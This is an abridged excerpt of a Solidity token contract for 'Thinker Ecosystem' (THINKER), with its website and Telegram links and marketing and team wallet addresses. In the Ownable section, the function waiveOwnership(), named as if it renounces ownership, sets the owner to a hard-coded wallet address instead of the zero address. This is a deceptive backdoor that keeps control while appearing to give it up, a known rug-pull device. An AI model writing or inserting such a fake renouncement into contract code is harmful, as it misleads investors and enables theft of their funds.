...
/**
Website : http://thinkerbsc.xyz/
Telegram : https://t.me/thinkerofficial
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xEfF0308429d419444068dDa7D4CC2e5A05d3F633);
    }
...
contract ThinkerEcosystem is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Thinker Ecosystem";
    string private _symbol = "THINKER";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x64De52B86535da177B2d16A0F0893Ec9fB2F1EAB);
    address payable public teamWalletAddress = payable(0x64De52B86535da177B2d16A0F0893Ec9fB2F1EAB);
